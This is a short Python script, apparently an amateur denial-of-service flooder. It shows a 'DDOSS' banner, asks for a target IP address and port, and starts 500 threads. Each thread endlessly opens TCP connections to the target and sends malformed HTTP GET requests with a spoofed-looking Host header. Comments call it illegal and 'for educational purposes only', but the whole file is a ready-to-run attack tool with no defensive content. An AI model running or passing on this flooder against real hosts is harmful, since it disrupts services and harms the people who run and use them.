from pip._vendor.distlib.compat import raw_input
import socket
import threading
import pyfiglet

result = pyfiglet.figlet_format("DDOSS", font="5lineoblique")
print(result)

target = raw_input("IP adress " r""">>>>----------> """)   # This is illegal
port = int(input("Port number " r""">>>>----------> """))  # FOR EDUCATIONAL PURPOSES ONLY NO MORE!!!
fake_ip = '182.21.20.32' # it is fake IP, I took it from stackoverflow

already_connected = 0

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("HOST: = fake_ip" + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()

        global already_connected
        already_connected += 1
        if already_connected % 500 == 0:
            print(already_connected)


for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()